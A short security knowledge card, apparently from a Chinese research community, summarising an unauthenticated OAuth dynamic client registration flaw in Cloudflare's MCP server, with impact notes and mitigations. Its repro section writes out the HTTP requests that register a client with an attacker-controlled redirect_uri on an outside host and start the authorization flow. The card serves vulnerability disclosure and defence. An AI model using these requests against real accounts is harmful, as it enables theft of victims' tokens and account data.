# Cloudflare MCP OAuth DCR 未授权注册

- Source report: `Cloudflare_DCR_漏洞报告.md`
- Full report: `domains/auth-security/case-reports/cloudflare-mcp-dcr/Cloudflare_DCR_漏洞报告.md`
- Techniques: auth, waf
- Fused: 2026-09-17

## Key findings (distilled)

- Cloudflare account resource access**: victim's AI gateway configs, audit logs, DNS analytics, worker bindings, observability data, websearch usage
- Enforce exact-match redirect_uri whitelist (reject attacker domains)
- Require client secrets / enforce PKCE

## Repro snippets

```
GET https://mcp.cloudflare.com/.well-known/oauth-authorization-server
POST https://mcp.cloudflare.com/register
Content-Type: application/json

{"client_name":"bb-verify-0908","redirect_uris":["https://91-99-208-165.sslip.io/cb"],"grant_types":["authorization_code"],"response_types":["code"],"token_endpoint_auth_method":"none"}
GET https://mcp.cloudflare.com/authorize?response_type=code&client_id=SAAbphMD1jwqLdZC&redirect_uri=https%3A%2F%2F91-99-208-165.sslip.io%2Fcb&state=x&code_challenge=...&code_challenge_method=S256
```

## When to reuse

- 同类标签命中：auth, waf
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
